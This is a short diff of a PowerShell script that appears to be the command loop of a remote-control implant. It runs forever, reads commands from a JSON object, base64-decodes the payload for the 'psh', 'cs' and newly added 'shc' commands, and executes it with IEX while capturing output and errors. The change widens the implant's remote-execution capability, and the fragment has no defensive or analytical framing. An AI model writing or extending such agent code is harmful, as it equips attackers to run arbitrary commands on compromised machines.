@@ -75,7 +75,7 @@ while ($True) {
 			}
 		}
 
-		elseif($jsObject['cmnd'].split(" ")[0] -eq "psh" -or ($jsObject['cmnd'].split(" ")[0] -eq "cs")) {
+		elseif($jsObject['cmnd'].split(" ")[0] -eq "psh" -or $jsObject['cmnd'].split(" ")[0] -eq "cs" -or $jsObject['cmnd'].split(" ")[0] -eq "shc") {
 			$psdata = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($jsObject['cmnd'].split(" ")[1]))
 			$retval = IEX $psdata -ErrorVariable err 2>&1
 			if($err) {
